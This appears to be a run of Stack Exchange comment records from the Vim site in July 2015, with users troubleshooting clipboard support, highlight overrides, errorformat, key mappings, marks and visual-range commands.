  <row Id="5781" PostId="3984" Score="0" Text="This is great, and an excellent example of well-written VimScript! Some minor (perhaps picky) feedback: This repeat command would behave different from the way the built-in `.` behaves with a count. When a count is supplied to `.`, the previous count is ignored. So `2dd` followed by `3.` would delete 2 lines and then 3 lines; in contrast, with your mappings, `2&lt;C-w&gt;-` followed by `3Q` would shrink the window by 2 lines and then by 6 (= 2x3) lines. That behaviour is fine, but it's nice to draw from analogous built-in Vim commands when choosing how a custom command should behave." CreationDate="2015-07-20T14:52:54.227" UserId="64" />
  <row Id="5782" PostId="3984" Score="0" Text="Thanks!  Also, I see what you mean with how the count works.  I may change it so it works that way." CreationDate="2015-07-20T15:17:05.410" UserId="865" />
  <row Id="5783" PostId="4003" Score="0" Text="The first section did the trick for me: fortunately my use case was the 'markdown' and 'mail file types. Thank you for the very detailed answer." CreationDate="2015-07-20T16:10:58.430" UserId="2894" />
  <row Id="5784" PostId="3995" Score="0" Text="I didn't issue any downvotes, but my concern with this approach is its potential to litter my good-list with nonsense words from chunks of URLs." CreationDate="2015-07-20T16:11:42.087" UserId="2894" />
  <row Id="5785" PostId="3995" Score="0" Text="@noffle The idea was to save all that garbage in a separate (throw-away) custom dictionary.  But the answer posted by Carpetsmoker makes more sense anyway." CreationDate="2015-07-20T16:37:43.900" UserId="1577" />
  <row Id="5786" PostId="3971" Score="0" Text="@VanLaser _It's the 'point based system'_ - Then my method of gaming the system is pretty inefficient, since I actually lost the upvote points by deleting my answer.  Not to mention that there are strategies that seem to work better for some [people](http://stackexchange.com/users/52354/tim?tab=accounts) than actually answering questions. :)" CreationDate="2015-07-20T17:17:20.870" UserId="1577" />
  <row Id="5787" PostId="3971" Score="0" Text="Then you care about your answer being checked. But one thing is sure, it wasn't the fault of 'garyjohn', so your attack was misplaced. Also: this answer, while originally incomplete, was actually very well thought, because it tried to stay true to the OP intention - something as close as possible to doing an AND between the two `autocmd`s. In any case, this shows the nature of this site: the  guy who asks and those who visit the site check and give points, and the more knowledgeable guys compete between themselves, in something that the original OP doesn't care or sometimes even understands." CreationDate="2015-07-20T18:08:43.097" UserId="1800" />
  <row Id="5788" PostId="3971" Score="0" Text="@VanLaser I'm not sure I understand your point.  Actually, I'm pretty sure I don't.  I deleted my answer simply because the OP has stated that he's happy with the answer he accepted.  That's the official recommendation when there are several good answers, and at least one is strictly better than yours, right? The original answer was IMO less than great and I criticised it (I would have done that even if I haven't posted another answer), but I admitted that it's better than mine when the OP said so.  Where exactly is the &quot;attack&quot;, the &quot;fault&quot;, the &quot;competition&quot;, and whatever else you saw above?" CreationDate="2015-07-20T18:28:29.767" UserId="1577" />
  <row Id="5789" PostId="3971" Score="0" Text="I don't see why one would delete a good answer. Variety is good - you may give ideas to ALL the others who later visit the thread and have the same question. And yes, I meant your original critique, and all this thread in general :P" CreationDate="2015-07-20T18:31:16.207" UserId="1800" />
  <row Id="5790" PostId="3971" Score="0" Text="@VanLaser Because according to the OP my answer wasn't good enough.  Regardless of what I thought about it. _shrug_" CreationDate="2015-07-20T18:32:57.560" UserId="1577" />
  <row Id="5791" PostId="3971" Score="0" Text="@lcd047 - you care too much then ;)" CreationDate="2015-07-20T18:35:30.847" UserId="1800" />
  <row Id="5792" PostId="3976" Score="1" Text="@flashburn: This isn't specific to vim; it's how tab character behave in general. Printing a tab character advances to the next tab stop, however many columns that happens to be. The behavior goes back (at least) to manual typewriters." CreationDate="2015-07-20T21:52:05.343" UserId="2380" />
  <row Id="5793" PostId="4004" Score="0" Text="True, but this still leaves a blank line." CreationDate="2015-07-21T07:08:19.493" UserId="205" />
  <row Id="5794" PostId="2285" Score="0" Text="`:nohl` seems redundant to me - there are no trailing spaces which will be highlighted. Perhaps the previous values of `hl` should be restored? Not just set off." CreationDate="2015-07-21T12:42:47.640" UserId="182" />
  <row Id="5795" PostId="4006" Score="0" Text="Perhaps add a space after `0read`?  Also wrap `g:filePath` in a `fnameescape()`?" CreationDate="2015-07-21T17:04:10.013" UserId="2313" />
  <row Id="5796" PostId="4010" Score="1" Text="Has your vim been compiled with the option `+clipboard`? You can check that with the function `:version()`. More precisely you can use `:echo has('clipboard')` to check if this precise option is enabled. If it is not you'll have to recompile a vim with this option." CreationDate="2015-07-22T05:03:21.710" UserId="1841" />
  <row Id="5797" PostId="4011" Score="1" Text="`@-@`? Is  that Bram's way of showing he's mad at use for making `@` part of words?" CreationDate="2015-07-22T05:59:09.190" UserId="205" />
  <row Id="5798" PostId="4012" Score="0" Text="Thanks, @Carpetsmoker! I didn't have the time to expand my answer until now." CreationDate="2015-07-22T14:04:22.827" UserId="21" />
  <row Id="5799" PostId="4011" Score="0" Text="Note that there are side effects to changing `iskeyword`. For example, if you add `@` to `iskeyword`, the standard word motion command (`w`) will also move across e.g. `@word @otherword`." CreationDate="2015-07-22T14:13:19.947" UserId="21" />
  <row Id="5800" PostId="4010" Score="1" Text="That's probably the problem, but you don't have to recompile to solve it. If gvim is installed, you can start it as `gvim -v` and get a terminal vim, or you can link gvim to vim, e.g., `ln /usr/bin/gvim ~/bin/vim` and make sure `~/bin` is before `/usr/bin` in your PATH." CreationDate="2015-07-22T16:07:40.130" UserId="2055" />
  <row Id="5801" PostId="4010" Score="0" Text="@garyjohn I don't understand how using a terminal vim instead of the gui version will enable the `clipboard` option?" CreationDate="2015-07-22T18:07:26.197" UserId="1841" />
  <row Id="5802" PostId="4010" Score="1" Text="@statox: The OP didn't say whether he was using vim or gvim, but this is a commonly-encountered problem with terminal vim on Ubuntu and Fedora systems, so I assumed the OP was using terminal vim. The problem is that these distributions build their vim packages without support for X, which I don't understand. They also have separate vim and gvim packages, which I don't understand, either. Gvim, of course, has support for X. Both vim and gvim binaries can be run in either terminal mode or GUI mode, depending on how they're invoked. ..." CreationDate="2015-07-22T18:35:35.250" UserId="2055" />
  <row Id="5803" PostId="4010" Score="1" Text="... My proposal was for the OP to run the gvim binary, which does support X and the clipboard, in terminal mode so that the clipboard will be available." CreationDate="2015-07-22T18:37:51.877" UserId="2055" />
  <row Id="5804" PostId="4010" Score="0" Text="@garyjohn Ok I understand better your suggestion now. I don't know if it's a really clean solution but that's a clever workaround :-)" CreationDate="2015-07-22T18:44:58.627" UserId="1841" />
  <row Id="5806" PostId="4010" Score="1" Text="@statox my vim doesn't have a `version()` function, but it does have a `:version` command. Is that a typo or is my `:version` missing `version()`?" CreationDate="2015-07-22T19:24:57.007" UserId="1306" />
  <row Id="5807" PostId="4010" Score="0" Text="@jjaderberg You are totally right vim doesn't have a `version()` function only a `:version` command. That was a typo, my bad. (Unfortunately I can't edit my comment anymore)" CreationDate="2015-07-22T19:28:09.873" UserId="1841" />
  <row Id="5808" PostId="4010" Score="0" Text="@statox It's rarely safe to say &quot;vim doesn't have...&quot;, but I figured it was probably a mistype, thanks for clarifying. It looks like the question will be merged anyway (hmm..) so the comments will be dropped, otherwise your comment would serve well as a partial answer–&quot;here's the first step to troubleshoot your issue...&quot;." CreationDate="2015-07-22T19:36:46.613" UserId="1306" />
  <row Id="5809" PostId="4017" Score="0" Text="Can you expand on your `gf` section (i'll get to others later). I'm typing `gf` over &quot;avatar&quot; and…nothing. Can you tell he how to check if my &quot;defaults&quot; are configured as you mention?" CreationDate="2015-07-22T20:52:23.303" UserId="2918" />
  <row Id="5810" PostId="4017" Score="0" Text="FWIW: `:setlocal includeexpr` -&gt; `includeexpr=rails#includeexpr(v:fname)`" CreationDate="2015-07-22T20:56:16.267" UserId="2918" />
  <row Id="5811" PostId="4017" Score="0" Text="That `includeexpr` is wrong, rails.vim has no business defining that for non-ruby/rails files and I suspect `suffixesadd` is wrong too. Also, see my edit." CreationDate="2015-07-22T21:07:15.907" UserId="54" />
  <row Id="5812" PostId="4010" Score="0" Text="@jjaderberg: Are you trying to get me to unmerge this question?" CreationDate="2015-07-22T21:49:35.150" UserId="2062" />
  <row Id="5813" PostId="4017" Score="0" Text="FYI: while editing a .scss file `:set suffixesadd` -&gt; `suffixesadd=.sass,.scss,.css`" CreationDate="2015-07-23T00:59:29.210" UserId="2918" />
  <row Id="5814" PostId="4021" Score="0" Text="Had to change the command a bit, otherwise it only seemed to affect the first file in the `args` list: `:argdo %s/^Z//ge | update`. Got the idea for that from the `:help argdo`. Thanks for the help nevertheless, wasn't familiar with this command until now! :)" CreationDate="2015-07-23T06:22:29.163" UserId="1045" />
  <row Id="5815" PostId="4021" Score="2" Text="It could also just be a matter of &quot;style&quot; to add them; perhaps they displayed different in the editor that the program was written in." CreationDate="2015-07-23T08:07:35.247" UserId="51" />
  <row Id="5816" PostId="4022" Score="0" Text="Pressing `^C` will abort whatever Vim is doing, such as applying colours. You probably just need to be more patient..." CreationDate="2015-07-23T09:49:05.487" UserId="51" />
  <row Id="5817" PostId="4018" Score="1" Text="+1 for a nicer way to comment blocks than ma + motion + :'a,.s/^/\/\// :)" CreationDate="2015-07-23T09:50:31.170" UserId="1430" />
  <row Id="5818" PostId="4022" Score="0" Text="@Carpetsmoker I would like to apply them now to the content what is there. The point is not to wait since I could put there too 2TB file." CreationDate="2015-07-23T09:58:02.530" UserId="2923" />
  <row Id="5819" PostId="4022" Score="1" Text="@Masi try running `:diffupdate`" CreationDate="2015-07-23T10:10:32.963" UserId="205" />
  <row Id="5820" PostId="4022" Score="1" Text="The &quot;content that is there&quot; is 2TB of data. Vim always reads the entire file into memory, so editing a 2TB file will not work in Vim unless you have a lot of swap space. Vim also doesn't diff by itself, it uses the extenal `diff` tool and parses the output of that. If you want to have it behave different, you'll have to write your own diffexpr function ([`:help diff-diffexpr`](http://vimhelp.appspot.com/diff.txt.html#diff%2ddiffexpr))..." CreationDate="2015-07-23T10:14:11.393" UserId="51" />
  <row Id="5821" PostId="4022" Score="0" Text="@Carpetsmoker My need is max 2 Gb now." CreationDate="2015-07-23T10:15:00.847" UserId="2923" />
  <row Id="5822" PostId="4022" Score="0" Text="@muru `:diffupdate` does not respond." CreationDate="2015-07-23T10:15:25.793" UserId="2923" />
  <row Id="5823" PostId="4023" Score="1" Text="Are you running Vim inside a terminal emulator? If so, then mapping `&lt;C-c&gt;` probably doesn't work." CreationDate="2015-07-23T10:50:46.950" UserId="51" />
  <row Id="5824" PostId="4023" Score="0" Text="I don't know the difference between a terminal and a terminal emulator, but I'm running it in iTerm2." CreationDate="2015-07-23T10:52:20.563" UserId="69" />
  <row Id="5826" PostId="4020" Score="1" Text="Note that `:set fo-=ro` won't work if you use `:set fo=or` (different order), you need to use `:set fo-=r fo-=o`." CreationDate="2015-07-23T12:33:53.713" UserId="51" />
  <row Id="5828" PostId="3992" Score="1" Text="You could add the words you want to skip to the `internal-wordlist`, with `zG`. Since the list is lost when you exit Vim, it's similar to 'skip', and Vim won't ask you again to correct the same word, in the same session. Another way would be to teach Vim to only spell-check by syntax, i.e. in *certain* regions, and ignore the others." CreationDate="2015-07-23T16:18:10.723" UserId="1800" />
  <row Id="5829" PostId="4026" Score="0" Text="Changes to the file are incremental, not independent. I think the best you can do is look at the diff with Gundo and sort of manually apply that portion of the change state." CreationDate="2015-07-24T03:39:49.540" UserId="64" />
  <row Id="5831" PostId="3457" Score="0" Text="With this, after opening a `readonly` file and then creating a new buffer the new buffer ends up `nomodifiable`." CreationDate="2015-07-24T05:13:45.550" UserId="268" />
  <row Id="5832" PostId="3457" Score="0" Text="Thanks for pointing that out, I hadn't noticed. I'm not sure how to test for a new buffer." CreationDate="2015-07-24T07:22:04.437" UserId="2283" />
  <row Id="5833" PostId="4027" Score="0" Text="possible duplicate of [GitHub for .vimrc and plugins](http://vi.stackexchange.com/questions/543/github-for-vimrc-and-plugins)" CreationDate="2015-07-24T07:35:39.793" UserId="163" />
  <row Id="5834" PostId="4027" Score="0" Text="Perhaps you want to use forward slashes? i.e. `set VIM=x:/path/to/repo`. I don't have a Windows machine to test, but all the docs use forwards slashes." CreationDate="2015-07-24T09:08:02.727" UserId="51" />
  <row Id="5837" PostId="4031" Score="1" Text="Also you could look at this post for further informations : http://superuser.com/questions/687441/how-to-undo-accidental-mark-overwrite-instead-of-jumping-in-vim" CreationDate="2015-07-24T09:43:15.827" UserId="1821" />
  <row Id="5838" PostId="4031" Score="0" Text="@Nobe4 thanks for your link I hadn't found it but it seems to confirm that it isn't really possible to do that easily." CreationDate="2015-07-24T09:50:59.550" UserId="1841" />
  <row Id="5839" PostId="4031" Score="0" Text="Use the jump commands (`ctrl-o`, `ctrl-i` and `:jumps`) with your own personal memory :)" CreationDate="2015-07-24T11:45:02.427" UserId="1800" />
  <row Id="5840" PostId="4032" Score="0" Text="Wow as usual amazing answer! I'll try take time this weekend to implement the exercice for the reader ;)" CreationDate="2015-07-24T11:53:25.940" UserId="1841" />
  <row Id="5841" PostId="4034" Score="0" Text="I'm not a great fan of the visible mark on the margin but it seems to have some interesting features I'll take a look at it." CreationDate="2015-07-24T11:55:33.187" UserId="1841" />
  <row Id="5842" PostId="4033" Score="0" Text="I can't really say that the problem is this type of navigation because I use those marks really occasionnaly and most of the time I navigate differently through my files. Nevertheless I've been thinking for a long time that I should use the jump list more often so that seems like a nice way to do it!" CreationDate="2015-07-24T12:00:54.937" UserId="1841" />
  <row Id="5843" PostId="4034" Score="0" Text="@statox In the same vein, there's also [showmarks](https://github.com/zakj/vim-showmarks).  It shows literally _all_ marks (the plugin above only deals with alphabetic ones), and can be toggled with a key.  I find it useful occasionally." CreationDate="2015-07-24T12:09:11.383" UserId="2313" />
  <row Id="5844" PostId="4034" Score="0" Text="Yes I've been using showmarks for a few time (unlike signature) that's why I said I'm not a fan of marks in the margin but I'm trying signature right now to see if I like it :-)" CreationDate="2015-07-24T12:14:17.697" UserId="1841" />
  <row Id="5845" PostId="4033" Score="0" Text="Even if they can be saved between vim sessions, it's too easy to overwrite marks. I added an alternative solution." CreationDate="2015-07-24T12:46:33.727" UserId="1800" />
  <row Id="5846" PostId="4033" Score="0" Text="Indeed your alternative solution seems to be worth a try thanks a lot!" CreationDate="2015-07-24T13:05:38.567" UserId="1841" />
  <row Id="5847" PostId="4027" Score="0" Text="Don't manually set the `VIM` environment variable.  `$VIM` and `$VIMRUNTIME` are automatically set by Vim when it runs.  You should prefer to use `$HOME` since that is your personal config area where as `$VIM` is a system directory, which you may not even have write access to." CreationDate="2015-07-24T14:20:56.020" UserId="15" />
  <row Id="5848" PostId="4035" Score="3" Text="`&lt;CR&gt;` is Enter, not  Control ... and I think you will need to remap Ctrl to Space at OS level." CreationDate="2015-07-24T23:08:48.533" UserId="1800" />
  <row Id="5849" PostId="4035" Score="0" Text="oh…i think i mistake one for another" CreationDate="2015-07-24T23:13:29.283" UserId="2206" />
  <row Id="5850" PostId="4035" Score="0" Text="@VanLaser But,even when I change the &lt;CR&gt; to &lt;C&gt;, it still doesn't work. Why?" CreationDate="2015-07-24T23:30:39.800" UserId="2206" />
  <row Id="5851" PostId="4035" Score="6" Text="Because ctrl key by itself cannot be mapped in vim.  It has to be in conjunction with another letter eg. `&lt;C-e&gt;`.  You will have to remap it at OS level, like @VanLaser said." CreationDate="2015-07-25T01:13:15.893" UserId="865" />
  <row Id="5852" PostId="715" Score="0" Text="what it is fortune -a ??" CreationDate="2015-07-25T14:37:49.527" UserId="2952" />
  <row Id="5853" PostId="715" Score="0" Text="@regedarek It displays a random joke. See:  https://en.wikipedia.org/wiki/Fortune_(Unix)" CreationDate="2015-07-25T15:47:15.300" UserId="51" />
  <row Id="5862" PostId="4038" Score="1" Text="This is a very old and very easy to google [&quot;issue&quot;](https://groups.google.com/forum/#!topic/vim_dev/sppdpElxY44). Please try a little harder next time." CreationDate="2015-07-26T18:49:46.770" UserId="54" />
  <row Id="5863" PostId="4038" Score="1" Text="That statement would be true for many questions on this site.  There would be hardly any questions on here if asking easily &quot;googleable&quot; questions was disallowed." CreationDate="2015-07-26T20:17:21.110" UserId="865" />
  <row Id="5864" PostId="4038" Score="0" Text="@romainl whoa!! Thanks for the link! I assumed `4193` was some random name and not reproable. That's incredible. Please post as an answer and I'll accept." CreationDate="2015-07-26T20:44:30.120" UserId="142" />
  <row Id="5865" PostId="4038" Score="1" Text="Why is this a bug? Rethink your file watcher to allow other programs to do their job as they can. Vim isn't doing something forbidden." CreationDate="2015-07-27T09:48:13.977" UserId="1800" />
  <row Id="5866" PostId="4041" Score="0" Text="It seems like `Vundle` didn't get installed properly, leading to ever `Vundle` command failing. How did you install `Vundle`, and what does your `.vimrc` contain?" CreationDate="2015-07-27T11:01:37.820" UserId="205" />
  <row Id="5867" PostId="4042" Score="0" Text="But Vundle is installed :-/. Vim works, I am working with Vim!! And I work inside vagrant machine." CreationDate="2015-07-27T17:03:50.237" UserId="2965" />
  <row Id="5868" PostId="4041" Score="1" Text="What is the value of `$EDITOR`? Is it `vim` or `vi`?" CreationDate="2015-07-27T17:24:09.633" UserId="778" />
  <row Id="5869" PostId="4038" Score="0" Text="@VanLaser: Yep, I've since added exceptions for `4913` and friends. The bug is that the file is called `4913` instead of `.vim_permissions_test`. I'm certain that I'm not the first person confused by such a filename. Just because it's not forbidden doesn't mean it's not unwise." CreationDate="2015-07-27T17:32:36.053" UserId="142" />
  <row Id="5870" PostId="4042" Score="0" Text="Oh I'm sorry I didn't understand that, my bad. Peter's comment on your question might be a better approach then." CreationDate="2015-07-27T17:56:48.520" UserId="1841" />
  <row Id="5871" PostId="4044" Score="3" Text="Does the order have anything to say? That is, what if you move the `highlight` commands to the bottom of the `vimrc` file?" CreationDate="2015-07-27T20:16:19.620" UserId="21" />
  <row Id="5872" PostId="4044" Score="0" Text="@KarlYngveLervåg No, that doesn't change anything." CreationDate="2015-07-27T21:08:07.893" UserId="2347" />
  <row Id="5873" PostId="4044" Score="1" Text="After starting Vim, what does `:verbose hi Comment` tell you?" CreationDate="2015-07-27T21:16:57.010" UserId="1306" />
  <row Id="5874" PostId="4044" Score="0" Text="@jjaderberg :verbose hi Comment&#xA;Comment        xxx term=bold ctermfg=14 guifg=#80a0ff&#xA;        Last set from /usr/local/share/vim/vim74/syntax/syncolor.vim" CreationDate="2015-07-27T21:20:28.563" UserId="2347" />
  <row Id="5875" PostId="4044" Score="0" Text="Is it perhaps [this issue](http://vi.stackexchange.com/q/3355/51)?" CreationDate="2015-07-27T21:25:27.600" UserId="51" />
  <row Id="5876" PostId="4044" Score="0" Text="Then that file is loaded after your vimrc and overrides your highlight instruction. When you re-source your vimrc your instruction is the last one and is then in effect. Somewhere in the files listed by the `:scriptnames` command is a script which loads that file. What does `:echo colors_name` tell you?" CreationDate="2015-07-27T21:28:02.237" UserId="1306" />
  <row Id="5877" PostId="4044" Score="0" Text="@jjaderberg :echo colors_name says &quot;E121: Undefined variable: colors_name&quot; followed by &quot;E15: Invalid expression: colors_name&quot;" CreationDate="2015-07-27T21:32:20.703" UserId="2347" />
  <row Id="5878" PostId="4044" Score="0" Text="This may be due to patches 757, 766 and 770 that were applied in late June and early July. They allow Vim to query the terminal's background color. I haven't updated since 729 so I can't verify. The feature uses T_RBG, so `:helpgrep \ct_rbg` may tell you something about it. `:verbose set bg?` may tell you something, too." CreationDate="2015-07-27T21:45:57.620" UserId="2055" />
  <row Id="5879" PostId="4038" Score="0" Text="Yes, I just wanted to say that it's not clear what your program / file watcher is doing, and why the fact that another program (i.e. vim) creates some temporary files would be &quot;alarming&quot; and &quot;a prohibitive bug&quot;. Is your program actually a vim plugin? (this isn't something important, just unclear)" CreationDate="2015-07-27T21:48:02.643" UserId="1800" />
  <row Id="5880" PostId="4044" Score="0" Text="Then most likely no colorscheme is loaded, but the `:syntax reset` command has been run, and it has been run after your vimrc is loaded. That command involves sourcing that `syncolor.vim` file and if you look at that you see a line that sets Comment to cyan when 'background' is 'dark'. What you see is a default but I'm not sure why the default is loaded after your vimrc. I can't pursue it now, but look at that file and you should be able to trace back when it is loaded and why." CreationDate="2015-07-27T21:51:38.183" UserId="1306" />
  <row Id="5881" PostId="4044" Score="0" Text="I just updated my Vim to 797 and verified the OP's problem. The problem is not there with 729 but is with 797. I'm also using xterm 318." CreationDate="2015-07-27T22:01:05.773" UserId="2055" />
  <row Id="5882" PostId="4044" Score="0" Text="@garyjohn Bingo! Adding &quot;set background=dark&quot; to somewhere before all the highlight commands does make the specified colors work again. If you make this or something to the effect an answer I'm happy to up your vim karma." CreationDate="2015-07-27T22:04:18.687" UserId="2347" />
  <row Id="5883" PostId="4044" Score="0" Text="Great! I'll post an answer. Setting 'background' to either light or dark seems to work, but what you used to have was light." CreationDate="2015-07-27T22:09:18.377" UserId="2055" />
  <row Id="5884" PostId="4046" Score="1" Text="`:bufdo` doesn't know about tabs, it opens every buffer in the current tab and runs your command on it. The `#` refers to the &quot;alternate file name&quot;, which is the &quot;last file name&quot; AFAIK. It's to easily switch between 2 files (like `cd -`). This is a &quot;buffer-based workflow&quot; versus a &quot;tab-based workflow&quot; thing (they don't always mix very well)." CreationDate="2015-07-28T12:52:28.633" UserId="51" />
  <row Id="5885" PostId="4046" Score="0" Text="I see. So in this case `tabdo` would be the way to go." CreationDate="2015-07-28T13:07:43.653" UserId="1066" />
  <row Id="5887" PostId="4051" Score="0" Text="This is certainly a start, but I make frequent use of the equation, align, and IEEEeqnarray environments, and I don't want to exclude those from my search." CreationDate="2015-07-28T18:23:22.293" UserId="2976" />
  <row Id="5888" PostId="4051" Score="0" Text="@RobF.: it's quite possible to match inside a range of environments, but it's not going to be easy unless one scripts it. If, however, you consistently use `\mathit` around variable names, finding them is much easier." CreationDate="2015-07-28T18:33:06.070" UserId="2942" />
  <row Id="5889" PostId="4052" Score="0" Text="Wow! It worked! Thanks so much! If possible, can you please explain the solution a bit more? As i understand, dots (.) are used for string concatenation, right? And instead of escaping all spaces etc., errorformat string is surrounded by quotes. But what does `%\%%` sequence mean? And what is the difference between `let &amp;errorformat` and `CompilerSet errorformat`? (the latter does not work with the efm string specified above)." CreationDate="2015-07-28T20:35:17.360" UserId="2725" />
  <row Id="5890" PostId="4050" Score="1" Text="I think the answer is no: there is no _easy_ way to limit a search to a specific syntax region." CreationDate="2015-07-28T20:44:44.320" UserId="21" />
  <row Id="5891" PostId="4052" Score="1" Text="@siphiuel If you read the docs, you will find that the errorformats are tried consecutively until one matches. The first entries have highest priority. Thus the solution by @lcd047 consists of 4 entries, where the first one matches errors that contains the `compileJava` or `compileTarget` lines. The second matches the other errors, the third defines a &quot;pointer line&quot; and the end of en error message, and the final entry says to ignore every remaining lines." CreationDate="2015-07-28T20:49:23.823" UserId="21" />
  <row Id="5892" PostId="4046" Score="0" Text="Perhaps also use `setlocal` instead of `set`?  It doesn't make much sense to set the same global option several times." CreationDate="2015-07-28T20:58:26.950" UserId="2313" />
  <row Id="5893" PostId="4053" Score="4" Text="Something like this, perhaps: https://github.com/coderifous/textobj-word-column.vim" CreationDate="2015-07-28T22:42:33.790" UserId="1800" />
  <row Id="5894" PostId="4053" Score="0" Text="@VanLaser That comment sure sounds like an answer." CreationDate="2015-07-29T00:16:10.003" UserId="268" />
  <row Id="5895" PostId="4057" Score="1" Text="Yay for `:pc`! I didn't realise that the &quot;preview&quot; name was special." CreationDate="2015-07-29T03:07:05.827" UserId="205" />
  <row Id="5896" PostId="4058" Score="0" Text="What do you mean by &quot;refuse&quot;? What happens exactly?" CreationDate="2015-07-29T07:23:28.207" UserId="54" />
  <row Id="5897" PostId="4060" Score="0" Text="[This answer](http://vi.stackexchange.com/a/4043/1841) might be related: It seems that it is not possible to map `ctrl` on its own... I'm curious but why do you need to disable this key?" CreationDate="2015-07-29T07:43:01.857" UserId="1841" />
  <row Id="5898" PostId="4060" Score="0" Text="I've quite big hands and after a day of work my pinky hurts. So I want to force myself to use more ergonomical alternatives." CreationDate="2015-07-29T08:00:59.990" UserId="153" />
  <row Id="5899" PostId="4060" Score="1" Text="I would have understand that with an [emacs user](https://en.wikipedia.org/wiki/Emacs#Emacs_pinky) but with vim I'm pretty surprised it has never been a problem for me... Anyway maybe you'll be interested in the function of the answer I linked in my previous comment which remaps all the combination of keys between `&lt;C-a&gt;` and `&lt;C-z&gt;` to `&lt;Space-a&gt;` to `&lt;Space-z&gt;`" CreationDate="2015-07-29T08:06:37.503" UserId="1841" />
  <row Id="5900" PostId="4053" Score="0" Text="Ok, I added an answer based on this." CreationDate="2015-07-29T09:32:21.350" UserId="1800" />
  <row Id="5901" PostId="4058" Score="0" Text="@romainl just an `a` gets input in my example." CreationDate="2015-07-29T11:57:22.780" UserId="1097" />
  <row Id="5902" PostId="4063" Score="0" Text="I'm not sure I understand your problem: with a Debian and vim 7.3 if I cd to `/usr/local` and start vim with `vim /usr` I get netrw showing the content of `/usr`. Also if I create a simple script containing `vim /usr/local` vim starts with netrw listing the directory no matter where I am when I start the script." CreationDate="2015-07-29T12:05:42.960" UserId="1841" />
  <row Id="5903" PostId="4060" Score="1" Text="Use your operating system's facilities for this? For example xmodmap on Linux." CreationDate="2015-07-29T12:59:10.480" UserId="51" />
  <row Id="5904" PostId="4055" Score="1" Text="KISS: `:nnoremap &lt;silent&gt; * :let @/='\C\&lt;' . expand('&lt;cword&gt;') . '\&gt;'&lt;CR&gt;n` (the last S stands for &quot;solution&quot;;)" CreationDate="2015-07-29T13:17:18.700" UserId="599" />
  <row Id="5905" PostId="4056" Score="1" Text="Something that might make `Ctrl` less annoying is remapping `Caps Lock` to `Ctrl` or swapping them if you want to keep `Caps Lock` available." CreationDate="2015-07-29T13:35:26.953" UserId="2736" />
  <row Id="5906" PostId="4066" Score="1" Text="What does your 'makeprg' look like (`:set makeprg?`)? What command exactly is executed when you do `:make build`?" CreationDate="2015-07-29T16:12:54.057" UserId="1306" />
  <row Id="5907" PostId="4061" Score="0" Text="`:bufdo` will make last processed buffer the current buffer. If the `:make` command that you are redoing refers to &quot;current buffer&quot; or &quot;file of current buffer&quot;, or if making the last processed buffer the current buffer involves changes to 'pwd' or other pertinent options you may end up running a different command than intended." CreationDate="2015-07-29T16:18:40.507" UserId="1306" />
  <row Id="5908" PostId="4068" Score="0" Text="there was a space before `!`. it is like, `:'&lt;,'&gt; !tee &gt;(xsel -b)`" CreationDate="2015-07-29T16:56:27.237" UserId="2988" />
  <row Id="5909" PostId="4068" Score="0" Text="@MadhavanKumar: you can have spaces between the range and the command." CreationDate="2015-07-29T16:57:47.467" UserId="2942" />
  <row Id="5910" PostId="4068" Score="0" Text="Are you sure you're not mixing up &quot;!-filter&quot; and &quot;!-command&quot;? See `:help !` and `:help :!`. Filter takes a range (`:help :range!`). I don't understand why one would use `'&gt;,'&gt;` for a range, however, or how this particular command is supposed to work." CreationDate="2015-07-29T17:12:53.403" UserId="1306" />
  <row Id="5911" PostId="4067" Score="0" Text="Apart from answering your question, have you looked at http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim for how to yank visual selection to system clipboard?" CreationDate="2015-07-29T17:15:01.200" UserId="1306" />
  <row Id="5912" PostId="4068" Score="0" Text="@jjaderberg: yes, I did, thank you for pointing that out. I thought something looked off when I wrote that paragraph, but I didn't think to look at `:h range!`. I'll put on my thinking hat again." CreationDate="2015-07-29T17:24:53.713" UserId="2942" />
  <row Id="5913" PostId="4068" Score="0" Text="Well the question is about visual selection marks and you have partially answered that. What I don't understand is how `'&gt;,'&gt;`, ie &quot;from last line of last visual selection to last line of last visual selection&quot;, can work for OP. Strictly the answer is &quot;The one selects from beginning to end of last visual selection, the other from end to end&quot;, so if you add that and references to relevant help topics you have answered the question. If your thinking hat yields result I'd be interested to know how/why OPs command works." CreationDate="2015-07-29T17:50:44.047" UserId="1306" />
  <row Id="5914" PostId="4068" Score="0" Text="PS Usually (f.i., in a visual mode mapping) these mark motions don't work for a &quot;currently highlighted&quot; area–you have to add `&lt;Esc&gt;` to the mapping to leave visual mode first. The `:h v_:` case is different though. Also, I can't follow up now, but a possible reason why OPs command works is that a mark motion initiated with `'` (as opposed to &quot;`&quot;) is linewise. Visually select a char, escape visual mode and `d'&gt;` will delete the entire line. If OP visually selected exactly one line, it may make sense that he finds in clipboard what he expects. No idea if that's what's happening." CreationDate="2015-07-29T18:04:43.030" UserId="1306" />
  <row Id="5915" PostId="4068" Score="0" Text="There's a thunderstorm and I shut down my equipment in the middle of editing that comment. I got the &quot;escaped backtick&quot; all wrong and I can't change it now, I hope it's legible despite the terrible mark(up|down) (single-quote is linewise, as opposed to backtick–that was the point)." CreationDate="2015-07-29T18:26:22.977" UserId="1306" />
  <row Id="5916" PostId="4068" Score="0" Text="@jjaderberg: I can't convince myself that I've reproduced the OPs setup well enough, but I think you have it there. I'll amend the answer along those lines. BTW: I was thinking of when you initiate a `:` command while you have a selection in Visual mode, but that's neither here or there, really." CreationDate="2015-07-29T18:43:02.260" UserId="2942" />
  <row Id="5917" PostId="4068" Score="0" Text="That seems a good answer to me. Maybe someone else can a) confirm or deny that the `'&gt;,'&gt;` is equivalent to the last line of a selection (`iaaa&lt;Esc&gt;hv:&lt;Left&gt;&lt;Left&gt;&lt;Left&gt;&lt;Bs&gt;&gt;&lt;Right&gt;&lt;Right&gt;&lt;Right&gt;d&lt;Cr&gt;` on empty buffer–i.e. visually select a char on a line, enter cmd-line mode, change the range to `'&gt;,'&gt;`, add `d` for a command, run it–tells me that it is) and b) explain why OPs command does not work with the standard `'&lt;,'&gt;` range. But that would be sugar, you've answered the actual question asked." CreationDate="2015-07-29T19:13:17.830" UserId="1306" />
  <row Id="5918" PostId="4074" Score="0" Text="Here I've written a perfectly good troubleshooting answer, and you come and sideline me with a simple issue reference ;-) +1 (Though, since you patched it, would you consider adding the relevant part of the patch to your answer for those who will not or cannot easily build/acquire a newer version of vim?)" CreationDate="2015-07-29T20:06:02.900" UserId="1306" />
